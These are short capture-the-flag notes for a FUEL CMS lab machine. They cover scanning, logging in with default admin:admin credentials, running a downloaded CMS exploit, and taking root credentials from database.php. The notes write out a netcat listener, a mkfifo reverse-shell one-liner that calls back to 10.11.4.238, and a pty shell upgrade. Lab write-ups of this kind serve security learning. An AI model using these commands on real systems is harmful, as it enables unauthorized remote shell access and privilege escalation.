+ Ran initial nmap scan to find FUEL CMS running.
+ Robots told me that /fuel/ is disallowed.
+ Fuel CMS admin:admin works!
+ Downloaded exploit for Fuel CMS and it works after a little bit of editing.
+ Exploit worked and obtained user flag in home of www-data.
+ database.php file looks interesting, found thru the Fuel CMS page
+ Database.php has root:mememe creds
+ Start a nc listener:	
	`nc -nlvp 6969`
+ Run the following:
	`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.4.238 6969 >/tmp/f`
+ Spawn shell:
	`python -c 'import pty; pty.spawn("/bin/sh")'`
+ Set ENV:
	`export TERM=xterm`
+ Use su and password found to gain root.
+ Found root.txt on root folder. 
